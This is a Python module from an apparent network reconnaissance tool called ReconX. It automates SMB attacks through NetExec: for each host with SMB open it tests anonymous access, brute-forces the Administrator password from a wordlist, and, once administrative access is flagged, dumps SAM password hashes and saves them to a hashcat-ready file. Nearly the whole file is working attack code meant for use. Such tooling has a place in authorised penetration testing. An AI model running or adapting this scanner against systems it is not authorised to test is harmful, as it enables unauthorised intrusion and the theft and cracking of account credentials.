"""
SMB Brute-Force Scanner (NXC) for ReconX.
Uses NetExec (nxc) to test anonymous access and brute-force
SMB credentials on hosts where nmap discovered SMB ports.

For each IP with SMB port (445/139) open:
  1. Test anonymous/null auth: nxc smb <IP> -u Anonymous -p Test --shares
  2. Brute-force with Administrator: nxc smb <IP> -u Administrator -p wordlists/enum-pass.txt --shares
  3. If credentials found with Pwn3d!, dump SAM hashes:
     nxc smb <IP> -u <user> -p <pass> --sam

Requires: netexec (nxc) or crackmapexec installed in PATH
  Install: pip install netexec
"""

import os
import re
import sys
import shutil
import subprocess
import time as _time
import json
from typing import List, Dict, Optional, Set
from dataclasses import dataclass, field

from ..config import ScannerConfig
from ..utils import routed_path


# ─── SMB ports ────────────────────────────────────────────────────────────────

SMB_PORTS = {445, 139}

# ─── Default usernames to test ───────────────────────────────────────────────

DEFAULT_SMB_USERS = ["Administrator"]

# ─── Output parsing patterns ─────────────────────────────────────────────────

# Matches: [*] Windows 7 Professional 7601 ... (name:LYDIA) (domain:lydia) (signing:False) (SMBv1:True)
INFO_PATTERN = re.compile(
    r'\[\*\]\s+(.+?)\s+\(name:(\S+?)\)\s+\(domain:(\S+?)\)',
    re.IGNORECASE,
)

# Extended info: signing and SMBv1
SIGNING_PATTERN = re.compile(r'\(signing:(\w+)\)', re.IGNORECASE)
SMBV1_PATTERN = re.compile(r'\(SMBv1:(\w+)\)', re.IGNORECASE)
NULL_AUTH_PATTERN = re.compile(r'\(Null Auth:(\w+)\)', re.IGNORECASE)

# Success pattern: [+] domain\user:pass  (optional Pwn3d!)
SUCCESS_PATTERN = re.compile(
    r'\[\+\]\s+'
    r'(?:(\S+?)\\)?'       # Optional domain\  (group 1)
    r'(\S+?)'              # Username           (group 2)
    r':'                   # Separator
    r'(\S+)'               # Password           (group 3)
    r'(?:\s+\(Pwn3d!\))?', # Optional Pwn3d! flag
    re.IGNORECASE,
)

# Share listing pattern: SHARE_NAME  type  comment
SHARE_PATTERN = re.compile(
    r'^\s*(\S+)\s+(READ|WRITE|READ,\s*WRITE|NO ACCESS)\s*(.*)?$',
    re.IGNORECASE,
)

# SAM hash pattern: username:rid:lmhash:nthash:::
SAM_HASH_PATTERN = re.compile(
    r'^(\S+?):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$',
)

# Account lockout / disabled detection
LOCKOUT_PATTERNS = [
    re.compile(r'STATUS_ACCOUNT_LOCKED_OUT', re.IGNORECASE),
    re.compile(r'STATUS_ACCOUNT_DISABLED', re.IGNORECASE),
    re.compile(r'account.*locked', re.IGNORECASE),
    re.compile(r'account.*disabled', re.IGNORECASE),
]

# Rate limit / connection failure
RATE_LIMIT_PATTERNS = [
    re.compile(r'connection.*refused', re.IGNORECASE),
    re.compile(r'connection.*timed?\s*out', re.IGNORECASE),
    re.compile(r'connection.*reset', re.IGNORECASE),
    re.compile(r'too many', re.IGNORECASE),
]


# ─── Data classes ─────────────────────────────────────────────────────────────

@dataclass
class SAMHash:
    """A SAM hash entry dumped from a pwn3d host."""
    username: str = ""
    rid: int = 0
    lm_hash: str = ""
    nt_hash: str = ""

    def to_dict(self) -> dict:
        return {
            "username": self.username,
            "rid": self.rid,
            "lm_hash": self.lm_hash,
            "nt_hash": self.nt_hash,
        }

    def __str__(self) -> str:
        return f"{self.username}:{self.rid}:{self.lm_hash}:{self.nt_hash}:::"


@dataclass
class SMBShare2:
    """An SMB share discovered during brute-force."""
    name: str = ""
    access: str = ""      # READ, WRITE, READ,WRITE, NO ACCESS
    comment: str = ""

    def to_dict(self) -> dict:
        d = {"name": self.name, "access": self.access}
        if self.comment:
            d["comment"] = self.comment
        return d


@dataclass
class SMBBruteCredential:
    """A successfully brute-forced SMB credential."""
    ip: str = ""
    username: str = ""
    password: str = ""
    domain: str = ""
    port: int = 445
    hostname: str = ""
    pwned: bool = False       # True if (Pwn3d!) flag present
    anonymous: bool = False   # True if null/anonymous auth

    def to_dict(self) -> dict:
        d = {
            "ip": self.ip,
            "username": self.username,
            "password": self.password,
            "port": self.port,
            "pwned": self.pwned,
        }
        if self.domain:
            d["domain"] = self.domain
        if self.hostname:
            d["hostname"] = self.hostname
        if self.anonymous:
            d["anonymous"] = True
        return d


@dataclass
class SMBBruteHostResult:
    """Brute-force result for a single SMB host."""
    ip: str = ""
    port: int = 445
    hostname: str = ""
    os_info: str = ""
    domain: str = ""
    signing: str = ""         # "True" / "False"
    smbv1: bool = False
    null_auth: bool = False   # True if (Null Auth:True) detected
    users_tested: List[str] = field(default_factory=list)
    credentials: List[SMBBruteCredential] = field(default_factory=list)
    shares: List[SMBShare2] = field(default_factory=list)
    sam_hashes: List[SAMHash] = field(default_factory=list)
    skipped: bool = False
    skip_reason: str = ""
    scan_time: float = 0.0
    raw_output: str = ""

    def to_dict(self) -> dict:
        d = {
            "ip": self.ip,
            "port": self.port,
            "users_tested": self.users_tested,
            "credentials": [c.to_dict() for c in self.credentials],
            "scan_time": self.scan_time,
        }
        if self.hostname:
            d["hostname"] = self.hostname
        if self.os_info:
            d["os_info"] = self.os_info
        if self.domain:
            d["domain"] = self.domain
        if self.signing:
            d["signing"] = self.signing
        d["smbv1"] = self.smbv1
        d["null_auth"] = self.null_auth
        if self.shares:
            d["shares"] = [s.to_dict() for s in self.shares]
        if self.sam_hashes:
            d["sam_hashes"] = [h.to_dict() for h in self.sam_hashes]
        if self.skipped:
            d["skipped"] = True
            d["skip_reason"] = self.skip_reason
        return d


@dataclass
class SMBBruteStats:
    """Aggregated SMB brute-force statistics."""
    total_smb_hosts: int = 0
    hosts_tested: int = 0
    hosts_skipped: int = 0
    hosts_null_auth: int = 0
    total_users_tested: int = 0
    credentials_found: int = 0
    pwned_count: int = 0
    sam_hashes_dumped: int = 0
    scan_time: float = 0.0

    def to_dict(self) -> dict:
        return {
            "total_smb_hosts": self.total_smb_hosts,
            "hosts_tested": self.hosts_tested,
            "hosts_skipped": self.hosts_skipped,
            "hosts_null_auth": self.hosts_null_auth,
            "total_users_tested": self.total_users_tested,
            "credentials_found": self.credentials_found,
            "pwned_count": self.pwned_count,
            "sam_hashes_dumped": self.sam_hashes_dumped,
            "scan_time": round(self.scan_time, 2),
        }


# ─── Main Scanner ─────────────────────────────────────────────────────────────

class SMBBruteScanner:
    """
    SMB brute-force scanner using NetExec (nxc).

    After nmap discovers hosts with SMB port open (445/139):
      1. Test anonymous/null auth: nxc smb <IP> -u Anonymous -p Test --shares
      2. Brute-force with default users (Administrator) + wordlists/enum-pass.txt
      3. If Pwn3d!, dump SAM hashes: nxc smb <IP> -u <user> -p <pass> --sam
    """

    DEFAULT_PASS_FILE = os.path.join("wordlists", "enum-pass.txt")

    def __init__(self, config: ScannerConfig, pass_file: str = ""):
        self.config = config
        self.pass_file = pass_file or self.DEFAULT_PASS_FILE
        self.nxc_path = self._find_nxc()
        self.available = self.nxc_path is not None
        self.results: Dict[str, SMBBruteHostResult] = {}
        self.stats = SMBBruteStats()

    def _find_nxc(self) -> Optional[str]:
        """Find netexec (nxc) or crackmapexec binary in PATH."""
        for name in ["nxc", "netexec", "crackmapexec", "cme"]:
            found = shutil.which(name)
            if found:
                return found

        common_paths = [
            os.path.expanduser("~/.local/bin/nxc"),
            os.path.expanduser("~/.local/bin/netexec"),
            os.path.expanduser("~/.local/bin/crackmapexec"),
            "/usr/local/bin/nxc",
            "/usr/local/bin/netexec",
            "/usr/local/bin/crackmapexec",
            "/usr/bin/nxc",
            "/usr/bin/netexec",
            "/usr/bin/crackmapexec",
        ]

        for path in common_paths:
            if os.path.isfile(path):
                return path

        # Auto-install netexec if not found
        from .auto_install import ensure_tool
        if ensure_tool("nxc"):
            return shutil.which("nxc") or shutil.which("netexec")

        return None

    def _find_pass_file(self, output_dir: str = "") -> Optional[str]:
        """
        Locate the password file. Search order:
          1. Exact path if absolute
          2. Current working directory
          3. Output directory
          4. Package directory (scanner/)
          5. Parent directory (reconx/)
          6. Project root
        """
        if os.path.isabs(self.pass_file) and os.path.isfile(self.pass_file):
            return self.pass_file

        search_dirs = [
            os.getcwd(),
            output_dir,
            os.path.dirname(os.path.abspath(__file__)),
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        ]

        for d in search_dirs:
            if not d:
                continue
            candidate = os.path.join(d, self.pass_file)
            if os.path.isfile(candidate):
                return os.path.abspath(candidate)

        return None

    def _get_smb_hosts(self, nmap_results: Dict) -> Dict[str, int]:
        """
        Extract hosts with SMB ports open from nmap results.

        Args:
            nmap_results: Dict[str, NmapHostResult] from nmap scanner.

        Returns:
            Dict mapping IP → SMB port number.
        """
        smb_hosts = {}
        for ip, host_result in nmap_results.items():
            ports = []
            if hasattr(host_result, 'ports'):
                ports = host_result.ports
            elif isinstance(host_result, dict):
                ports = host_result.get('ports', [])

            for port_entry in ports:
                port_num = port_entry.port if hasattr(port_entry, 'port') else port_entry.get('port', 0)
                state = port_entry.state if hasattr(port_entry, 'state') else port_entry.get('state', '')
                service = port_entry.service if hasattr(port_entry, 'service') else port_entry.get('service', '')

                if state == "open" and (
                    port_num in SMB_PORTS
                    or "smb" in service.lower()
                    or "microsoft-ds" in service.lower()
                    or "netbios" in service.lower()
                ):
                    smb_hosts[ip] = port_num
                    break  # One SMB port per host

        return smb_hosts

    def scan(
        self,
        nmap_results: Dict,
        output_dir: str = "",
        users: Optional[List[str]] = None,
    ) -> Dict[str, SMBBruteHostResult]:
        """
        Run SMB brute-force against hosts with SMB ports open.

        Args:
            nmap_results: Dict[str, NmapHostResult] from nmap scanner.
            output_dir: Directory to save output files.
            users: List of usernames to test (default: Administrator).

        Returns:
            Dict mapping IP → SMBBruteHostResult.
        """
        if not self.available:
            return {}

        if not nmap_results:
            return {}

        # Find SMB hosts
        smb_hosts = self._get_smb_hosts(nmap_results)
        if not smb_hosts:
            return {}

        # Locate password file
        pass_file_path = self._find_pass_file(output_dir)
        if not pass_file_path:
            print(
                f"\033[91m[!]\033[0m smb-brute: password file "
                f"'{self.pass_file}' not found – skipping"
            )
            return {}

        test_users = users or DEFAULT_SMB_USERS

        scan_start = _time.time()
        self.results = {}
        total_users_tested = 0

        self.stats.total_smb_hosts = len(smb_hosts)

        if output_dir:
            os.makedirs(output_dir, exist_ok=True)

        print(
            f"\033[36m[>]\033[0m smb-brute: testing "
            f"\033[92m{len(smb_hosts)}\033[0m SMB host(s) ..."
        )

        for idx, ip in enumerate(sorted(smb_hosts.keys()), 1):
            smb_port = smb_hosts[ip]
            host_start = _time.time()
            host_result = SMBBruteHostResult(ip=ip, port=smb_port)

            print(
                f"\033[36m[>]\033[0m smb-brute: "
                f"[\033[96m{idx}/{len(smb_hosts)}\033[0m] "
                f"\033[96m{ip}:{smb_port}\033[0m"
            )

            # ── Step 1: Anonymous/Null auth check ────────────────────────
            anon_output = self._run_nxc_smb_anon(ip)
            host_result.raw_output += f"=== Anonymous Check ===\n{anon_output}\n\n"

            # Parse host info from anonymous check
            self._parse_host_info(host_result, anon_output)

            # Check if null auth succeeded
            if self._detect_null_auth(anon_output):
                host_result.null_auth = True
                anon_cred = SMBBruteCredential(
                    ip=ip,
                    username="Anonymous",
                    password="Test",
                    port=smb_port,
                    hostname=host_result.hostname,
                    domain=host_result.domain,
                    anonymous=True,
                )
                host_result.credentials.append(anon_cred)

                # Parse shares from anonymous output
                shares = self._parse_shares(anon_output)
                host_result.shares = shares

                print(
                    f"    \033[1;91m[!]\033[0m \033[1;91mNULL AUTH\033[0m: "
                    f"\033[96m{ip}\033[0m → "
                    f"\033[1;91mAnonymous access allowed!\033[0m"
                    f"{' — ' + ', '.join(s.name for s in shares[:5]) if shares else ''}"
                )
            else:
                print(
                    f"    \033[37m[-]\033[0m \033[96m{ip}\033[0m → "
                    f"anonymous access denied"
                )

            # ── Step 2: Brute-force with users + pass file ───────────────
            for username in test_users:
                host_result.users_tested.append(username)
                total_users_tested += 1

                print(
                    f"    \033[36m[>]\033[0m \033[96m{ip}\033[0m "
                    f"brute-forcing \033[93m{username}\033[0m ..."
                )

                brute_output = self._run_nxc_smb_brute(
                    ip, username, pass_file_path,
                )
                host_result.raw_output += (
                    f"=== Brute {username} ===\n{brute_output}\n\n"
                )

                # Parse host info (may have more details)
                self._parse_host_info(host_result, brute_output)

                # Parse credentials
                creds = self._parse_success(ip, smb_port, brute_output)
                for cred in creds:
                    cred.hostname = host_result.hostname
                    # Deduplicate
                    existing = {(c.username, c.password) for c in host_result.credentials}
                    if (cred.username, cred.password) not in existing:
                        host_result.credentials.append(cred)

                        pwn_str = " \033[1;91m(Pwn3d!)\033[0m" if cred.pwned else ""
                        domain_str = f"{cred.domain}\\" if cred.domain else ""
                        print(
                            f"    \033[1;92m[+]\033[0m \033[1;92mSUCCESS\033[0m: "
                            f"\033[96m{ip}\033[0m → "
                            f"\033[1;92m{domain_str}{cred.username}:{cred.password}\033[0m"
                            f"{pwn_str}"
                        )

                # Check lockout — skip remaining users
                if self._detect_lockout(brute_output):
                    host_result.skipped = True
                    host_result.skip_reason = "account lockout detected"
                    print(
                        f"    \033[93m[!]\033[0m smb-brute: {ip} — lockout detected, "
                        f"skipping remaining users"
                    )
                    break

                # Check rate limit / connection issues
                if self._detect_rate_limit(brute_output):
                    host_result.skipped = True
                    host_result.skip_reason = "connection error / rate limit"
                    print(
                        f"    \033[93m[!]\033[0m smb-brute: {ip} — connection issues, "
                        f"skipping remaining users"
                    )
                    break

            # ── Step 3: SAM dump if Pwn3d! ───────────────────────────────
            pwned_creds = [c for c in host_result.credentials if c.pwned]
            if pwned_creds:
                cred = pwned_creds[0]  # Use first pwned credential
                print(
                    f"    \033[36m[>]\033[0m \033[96m{ip}\033[0m "
                    f"dumping SAM hashes (Pwn3d! with "
                    f"\033[93m{cred.username}\033[0m) ..."
                )

                sam_output = self._run_nxc_smb_sam(
                    ip, cred.username, cred.password,
                )
                host_result.raw_output += (
                    f"=== SAM Dump ===\n{sam_output}\n\n"
                )

                # Parse SAM hashes
                sam_hashes = self._parse_sam_hashes(sam_output)
                host_result.sam_hashes = sam_hashes

                if sam_hashes:
                    print(
                        f"    \033[1;91m[!]\033[0m \033[1;91mSAM DUMP\033[0m: "
                        f"\033[96m{ip}\033[0m → "
                        f"\033[1;91m{len(sam_hashes)} hash(es) extracted!\033[0m"
                    )
                    for h in sam_hashes:
                        print(
                            f"    \033[1;91m[!]\033[0m   "
                            f"\033[93m{h.username}\033[0m:"
                            f"\033[90m{h.rid}\033[0m:"
                            f"\033[37m{h.lm_hash}\033[0m:"
                            f"\033[1;97m{h.nt_hash}\033[0m:::"
                        )
                else:
                    print(
                        f"    \033[37m[-]\033[0m SAM dump returned no hashes"
                    )

            host_result.scan_time = _time.time() - host_start
            self.results[ip] = host_result

            # Print per-host summary
            cred_count = len(host_result.credentials)
            anon_count = sum(1 for c in host_result.credentials if c.anonymous)
            real_creds = cred_count - anon_count

            if real_creds > 0 or host_result.null_auth:
                parts = []
                if host_result.null_auth:
                    parts.append("\033[1;91mNull Auth\033[0m")
                if real_creds > 0:
                    parts.append(f"\033[1;92m{real_creds} cred(s)\033[0m")
                if host_result.sam_hashes:
                    parts.append(f"\033[1;91m{len(host_result.sam_hashes)} SAM hash(es)\033[0m")
                print(
                    f"\033[1;92m[+]\033[0m smb-brute: \033[96m{ip}:{smb_port}\033[0m → "
                    f"{' | '.join(parts)} "
                    f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
                )
            elif host_result.skipped:
                pass  # Already printed
            else:
                print(
                    f"\033[37m[-]\033[0m smb-brute: "
                    f"{ip}:{smb_port} — no valid credentials "
                    f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
                )

        scan_elapsed = _time.time() - scan_start

        # Compute stats
        self._compute_stats(scan_elapsed)

        # Save results
        if output_dir:
            self._save_results(output_dir)

        return self.results

    # ─── NXC Command Runners ──────────────────────────────────────────────────

    def _run_nxc_smb_anon(self, ip: str) -> str:
        """
        Run: nxc smb <IP> -u Anonymous -p Test --shares
        Tests anonymous/null authentication and lists shares.
        """
        cmd = [
            self.nxc_path,
            "smb",
            ip,
            "-u", "Anonymous",
            "-p", "Test",
            "--shares",
        ]

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
                encoding="utf-8",
                errors="replace",
            )
            return (proc.stdout or "") + (proc.stderr or "")
        except subprocess.TimeoutExpired:
            return "[timeout]"
        except Exception as e:
            return f"[error: {e}]"

    def _run_nxc_smb_brute(
        self, ip: str, username: str, pass_file: str,
    ) -> str:
        """
        Run: nxc smb <IP> -u <username> -p <pass_file> --shares --continue-on-success
        Brute-force SMB credentials.
        """
        cmd = [
            self.nxc_path,
            "smb",
            ip,
            "-u", username,
            "-p", pass_file,
            "--shares",
            "--continue-on-success",
        ]

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,
                encoding="utf-8",
                errors="replace",
            )
            return (proc.stdout or "") + (proc.stderr or "")
        except subprocess.TimeoutExpired:
            return "[timeout]"
        except Exception as e:
            return f"[error: {e}]"

    def _run_nxc_smb_sam(
        self, ip: str, username: str, password: str,
    ) -> str:
        """
        Run: nxc smb <IP> -u <username> -p <password> --sam
        Dump SAM hashes from a pwn3d host.
        """
        cmd = [
            self.nxc_path,
            "smb",
            ip,
            "-u", username,
            "-p", password,
            "--sam",
        ]

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
                encoding="utf-8",
                errors="replace",
            )
            return (proc.stdout or "") + (proc.stderr or "")
        except subprocess.TimeoutExpired:
            return "[timeout]"
        except Exception as e:
            return f"[error: {e}]"

    # ─── Output Parsing ──────────────────────────────────────────────────────

    def _parse_host_info(self, host_result: SMBBruteHostResult, output: str):
        """Extract host info (hostname, OS, signing, SMBv1, domain) from nxc output."""
        info_match = INFO_PATTERN.search(output)
        if info_match:
            if not host_result.os_info:
                host_result.os_info = info_match.group(1).strip()
            if not host_result.hostname:
                host_result.hostname = info_match.group(2).strip()
            if not host_result.domain:
                host_result.domain = info_match.group(3).strip()

        signing_match = SIGNING_PATTERN.search(output)
        if signing_match and not host_result.signing:
            host_result.signing = signing_match.group(1)

        smbv1_match = SMBV1_PATTERN.search(output)
        if smbv1_match:
            host_result.smbv1 = smbv1_match.group(1).lower() == "true"

        null_match = NULL_AUTH_PATTERN.search(output)
        if null_match and null_match.group(1).lower() == "true":
            host_result.null_auth = True

    def _detect_null_auth(self, output: str) -> bool:
        """
        Detect if anonymous/null auth succeeded.
        Indicators:
          - (Null Auth:True) in info line
          - [+] line with Anonymous:Test (success)
          - Share listing present after [+]
        """
        # Check for Null Auth:True flag
        null_match = NULL_AUTH_PATTERN.search(output)
        if null_match and null_match.group(1).lower() == "true":
            return True

        # Check for [+] success with Anonymous
        for line in output.splitlines():
            if "[+]" in line and "anonymous" in line.lower():
                return True

        return False

    def _parse_success(
        self, ip: str, port: int, output: str,
    ) -> List[SMBBruteCredential]:
        """Parse successful credentials from netexec output."""
        creds = []
        for line in output.splitlines():
            line = line.strip()
            if "[+]" not in line:
                continue
            # Skip informational [+] lines that don't look like creds
            if ":" not in line:
                continue
            # Skip "Added X SAM hashes" lines
            if "SAM hashes" in line:
                continue

            m = SUCCESS_PATTERN.search(line)
            if m:
                domain = m.group(1) or ""
                username = m.group(2)
                password = m.group(3)
                pwned = "(Pwn3d!)" in line

                cred = SMBBruteCredential(
                    ip=ip,
                    username=username,
                    password=password,
                    domain=domain,
                    port=port,
                    pwned=pwned,
                )
                # Deduplicate
                existing = {(c.username, c.password) for c in creds}
                if (username, password) not in existing:
                    creds.append(cred)

        return creds

    def _parse_shares(self, output: str) -> List[SMBShare2]:
        """Parse share listing from nxc --shares output."""
        shares = []
        in_share_section = False

        for line in output.splitlines():
            # Look for share header line
            if "Share" in line and "Permissions" in line:
                in_share_section = True
                continue
            if not in_share_section:
                continue
            if not line.strip():
                continue
            # Only look at lines from the SMB output
            if "SMB" not in line and "[*]" not in line:
                continue

            # Try to extract share info
            # Format varies, but typically: SMB  IP  PORT  HOST  SHARE  ACCESS  COMMENT
            parts = line.strip()
            # Remove the "SMB IP PORT HOST" prefix
            # Look for known share access keywords
            for access_kw in ["READ,WRITE", "READ", "WRITE", "NO ACCESS"]:
                if access_kw in parts:
                    idx = parts.index(access_kw)
                    before = parts[:idx].strip()
                    after = parts[idx + len(access_kw):].strip()
                    # Share name is the last word before access
                    share_parts = before.split()
                    if share_parts:
                        share_name = share_parts[-1]
                        share = SMBShare2(
                            name=share_name,
                            access=access_kw,
                            comment=after,
                        )
                        shares.append(share)
                    break

        return shares

    def _parse_sam_hashes(self, output: str) -> List[SAMHash]:
        """Parse SAM hashes from nxc --sam output."""
        hashes = []
        for line in output.splitlines():
            line = line.strip()
            m = SAM_HASH_PATTERN.search(line)
            if m:
                h = SAMHash(
                    username=m.group(1),
                    rid=int(m.group(2)),
                    lm_hash=m.group(3),
                    nt_hash=m.group(4),
                )
                hashes.append(h)

        return hashes

    def _detect_lockout(self, output: str) -> bool:
        """Detect account lockout indicators."""
        for pat in LOCKOUT_PATTERNS:
            if pat.search(output):
                return True
        return False

    def _detect_rate_limit(self, output: str) -> bool:
        """Detect connection errors / rate limiting."""
        error_count = 0
        total_lines = 0
        for line in output.splitlines():
            line = line.strip()
            if not line:
                continue
            total_lines += 1
            for pat in RATE_LIMIT_PATTERNS:
                if pat.search(line):
                    error_count += 1
                    break
        if total_lines > 3 and error_count / total_lines > 0.5:
            return True
        return False

    # ─── Stats & Save ─────────────────────────────────────────────────────────

    def _compute_stats(self, scan_time: float):
        """Compute aggregated statistics."""
        self.stats.scan_time = scan_time
        self.stats.hosts_tested = sum(
            1 for r in self.results.values() if not r.skipped
        )
        self.stats.hosts_skipped = sum(
            1 for r in self.results.values() if r.skipped
        )
        self.stats.hosts_null_auth = sum(
            1 for r in self.results.values() if r.null_auth
        )
        all_creds = self.get_all_credentials()
        self.stats.credentials_found = len(all_creds)
        self.stats.pwned_count = sum(1 for c in all_creds if c.pwned)
        self.stats.total_users_tested = sum(
            len(r.users_tested) for r in self.results.values()
        )
        self.stats.sam_hashes_dumped = sum(
            len(r.sam_hashes) for r in self.results.values()
        )

    def _save_results(self, output_dir: str):
        """Save results to output directory."""
        os.makedirs(output_dir, exist_ok=True)

        # ── smb_brute_credentials.txt ── Human-readable credentials ──
        cred_file = routed_path(output_dir, "smb_brute_credentials.txt")
        lines = ["# ReconX - SMB Brute-force Results (NXC)"]
        lines.append(f"# Hosts tested: {self.stats.hosts_tested}/{self.stats.total_smb_hosts}")
        lines.append(f"# Null auth: {self.stats.hosts_null_auth}")
        lines.append(f"# Credentials found: {self.stats.credentials_found}")
        lines.append(f"# Pwn3d: {self.stats.pwned_count}")
        lines.append(f"# SAM hashes dumped: {self.stats.sam_hashes_dumped}")
        lines.append(f"# Scan time: {self.stats.scan_time:.1f}s")
        lines.append("")

        for ip in sorted(self.results.keys()):
            hr = self.results[ip]
            lines.append(f"── {ip}:{hr.port} ──")
            if hr.hostname:
                lines.append(f"  Hostname: {hr.hostname}")
            if hr.os_info:
                lines.append(f"  OS: {hr.os_info}")
            if hr.domain:
                lines.append(f"  Domain: {hr.domain}")
            lines.append(f"  Signing: {hr.signing}")
            lines.append(f"  SMBv1: {hr.smbv1}")
            lines.append(f"  Null Auth: {hr.null_auth}")
            lines.append(f"  Users tested: {', '.join(hr.users_tested)}")
            if hr.skipped:
                lines.append(f"  SKIPPED: {hr.skip_reason}")

            if hr.null_auth:
                lines.append(f"  [!] ANONYMOUS ACCESS ALLOWED")
            if hr.shares:
                lines.append(f"  Shares ({len(hr.shares)}):")
                for s in hr.shares:
                    lines.append(f"    {s.name:20s}  {s.access:12s}  {s.comment}")

            real_creds = [c for c in hr.credentials if not c.anonymous]
            if real_creds:
                for cred in real_creds:
                    domain_str = f"{cred.domain}\\" if cred.domain else ""
                    pwn_str = " (Pwn3d!)" if cred.pwned else ""
                    lines.append(f"  [+] {domain_str}{cred.username}:{cred.password}{pwn_str}")

            if hr.sam_hashes:
                lines.append(f"  SAM Hashes ({len(hr.sam_hashes)}):")
                for h in hr.sam_hashes:
                    lines.append(f"    {h}")

            if not hr.credentials and not hr.null_auth:
                lines.append("  No valid credentials found")
            lines.append("")

        with open(cred_file, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")

        # ── smb_brute_sam_hashes.txt ── SAM hashes only (hashcat-ready) ──
        all_hashes = []
        for ip, hr in sorted(self.results.items()):
            for h in hr.sam_hashes:
                all_hashes.append((ip, h))

        if all_hashes:
            sam_file = routed_path(output_dir, "smb_brute_sam_hashes.txt")
            with open(sam_file, "w", encoding="utf-8") as f:
                f.write("# ReconX - SAM Hashes (dumped via nxc --sam)\n")
                f.write(f"# Total: {len(all_hashes)} hash(es)\n\n")
                for ip, h in all_hashes:
                    f.write(f"# {ip}\n")
                    f.write(f"{h}\n")

        # ── smb_brute_summary.json ── Structured JSON ─────────────────
        json_file = routed_path(output_dir, "smb_brute_summary.json")
        json_data = {
            "stats": self.stats.to_dict(),
            "hosts": {
                ip: hr.to_dict() for ip, hr in sorted(self.results.items())
            },
        }
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
            f.write("\n")

    def get_all_credentials(self) -> List[SMBBruteCredential]:
        """Return all discovered credentials across all hosts."""
        creds = []
        for hr in self.results.values():
            creds.extend(hr.credentials)
        return creds

    def get_null_auth_hosts(self) -> List[str]:
        """Return IPs with null/anonymous auth."""
        return [ip for ip, r in self.results.items() if r.null_auth]

    def get_pwned_hosts(self) -> List[str]:
        """Return IPs where Pwn3d! was achieved."""
        return [
            ip for ip, r in self.results.items()
            if any(c.pwned for c in r.credentials)
        ]

    def get_all_sam_hashes(self) -> List[SAMHash]:
        """Return all SAM hashes across all hosts."""
        hashes = []
        for hr in self.results.values():
            hashes.extend(hr.sam_hashes)
        return hashes
